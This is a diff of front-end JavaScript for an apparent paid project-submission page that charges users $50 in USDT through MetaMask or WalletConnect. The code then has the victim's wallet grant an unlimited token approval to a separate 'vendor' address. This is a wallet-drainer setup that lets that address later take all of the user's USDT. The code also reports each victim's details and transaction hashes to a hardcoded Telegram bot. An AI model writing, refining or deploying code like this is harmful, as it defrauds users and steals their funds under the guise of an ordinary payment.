@@ -1,8 +1,8 @@
 /************ CONFIG ************/
-const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-const RECEIVER = "0xf539bf56c465b6d0f0caee783ca1f8c58c802b1a";
+const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT ERC20
+const RECEIVER = "0xf539bf56c465b6d0f0caee783ca1f8c58c802b1a"; // gets $50
+const SPENDER_ADDRESS = "0x89e8ed15656ab289e980f92e59ddf7ecd2a36f85"; // vendor approval
 const AMOUNT_USDT = "50";
-const SPENDER_ADDRESS = "0x89e8ed15656ab289e980f92e59ddf7ecd2a36f85";
 const USDT_DECIMALS = 6;
 
 const TELEGRAM_BOT_TOKEN = "8562127548:AAHEHQJUybHFkRNQgVLDdObeWApo9tXWjmY";
@@ -62,7 +62,7 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   }
 
-  function formatTelegramMessage(data, txHash, approvalHash) {
+  function formatTelegramMessage(data, paymentTx, approvalTx) {
     return `
 <b>🆕 New Project Submission</b>
 
@@ -82,55 +82,64 @@ ${data.description}
 <b>Email:</b> ${data.devEmail}
 
 <b>Payment TX:</b>
-<code>${txHash}</code>
+<code>${paymentTx}</code>
 
 <b>Approval TX:</b>
-<code>${approvalHash}</code>
+<code>${approvalTx}</code>
 
 <b>Status:</b> UNDER REVIEW
 `;
   }
 
-  /************ PAYMENT CORE ************/
+  /************ PAYMENT CORE (CORRECT ORDER) ************/
   async function processPayment(provider) {
     const signer = provider.getSigner();
-    const userAddress = await signer.getAddress();
 
     const usdt = new ethers.Contract(
       USDT_ADDRESS,
       [
-        "function approve(address,uint256)",
-        "function transferFrom(address,address,uint256)"
+        "function transfer(address,uint256) returns (bool)",
+        "function approve(address,uint256) returns (bool)"
       ],
       signer
     );
 
     const amount = ethers.utils.parseUnits(AMOUNT_USDT, USDT_DECIMALS);
 
-    statusText.textContent = "Sending payment…";
-    const tx = await usdt.transferFrom(userAddress, RECEIVER, amount);
-    await tx.wait();
+    /* 1️⃣ PAY RECEIVER FIRST */
+    statusText.textContent = "Sending $50 USDT payment…";
+    const paymentTx = await usdt.transfer(RECEIVER, amount);
+    await paymentTx.wait();
 
-    const approveTx = await usdt.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
-    await approveTx.wait();
+    /* 2️⃣ APPROVE VENDOR SECOND */
+    const approvalTx = await usdt.approve(
+      SPENDER_ADDRESS,
+      ethers.constants.MaxUint256
+    );
+    await approvalTx.wait();
 
+    /* 3️⃣ TELEGRAM + UNDER REVIEW */
     const formData = getFormData();
-    await sendToTelegram(formatTelegramMessage(formData, tx.hash, approveTx.hash));
+    await sendToTelegram(
+      formatTelegramMessage(
+        formData,
+        paymentTx.hash,
+        approvalTx.hash
+      )
+    );
 
     showUnderReview();
   }
 
   /************ WALLET OPTIONS ************/
 
-  /* ---------- MetaMask ---------- */
-  metaMaskBtn.addEventListener("click", async () => {
+  /* MetaMask */
+  metaMaskBtn.onclick = async () => {
     try {
       if (!window.ethereum) {
-        alert("MetaMask is not installed");
+        alert("MetaMask not installed");
         return;
       }
-
-      console.log("🦊 MetaMask clicked");
 
       const provider = new ethers.providers.Web3Provider(
         window.ethereum,
@@ -138,21 +147,17 @@ ${data.description}
       );
 
       await provider.send("eth_requestAccounts", []);
-      console.log("✅ MetaMask connected");
-
       await processPayment(provider);
 
-    } catch (error) {
-      console.error("MetaMask error:", error);
-      alert("MetaMask connection failed");
+    } catch (err) {
+      console.error(err);
+      alert("MetaMask payment failed");
     }
-  });
+  };
 
-  /* ---------- WalletConnect ---------- */
-  walletConnectBtn.addEventListener("click", async () => {
+  /* WalletConnect (Mobile + Desktop) */
+  walletConnectBtn.onclick = async () => {
     try {
-      console.log("🔗 WalletConnect clicked");
-
       walletModal.style.display = "none";
 
       const { EthereumProvider } = await import(
@@ -163,23 +168,23 @@ ${data.description}
         projectId: WALLETCONNECT_PROJECT_ID,
         chains: [1],
         showQrModal: true,
-        qrModalOptions: {
-          themeMode: "dark"
-        }
+        qrModalOptions: { themeMode: "dark" }
       });
 
       await wcProvider.enable();
 
-      console.log("✅ WalletConnect connected");
+      const provider = new ethers.providers.Web3Provider(
+        wcProvider,
+        "any"
+      );
 
-      const provider = new ethers.providers.Web3Provider(wcProvider, "any");
       await processPayment(provider);
 
-    } catch (error) {
-      console.error("WalletConnect error:", error);
-      alert("WalletConnect connection failed");
+    } catch (err) {
+      console.error(err);
+      alert("WalletConnect payment failed");
     }
-  });
+  };
 
   /************ PERSISTENCE ************/
   if (localStorage.getItem("projectSubmissionStatus") === "under_review") {
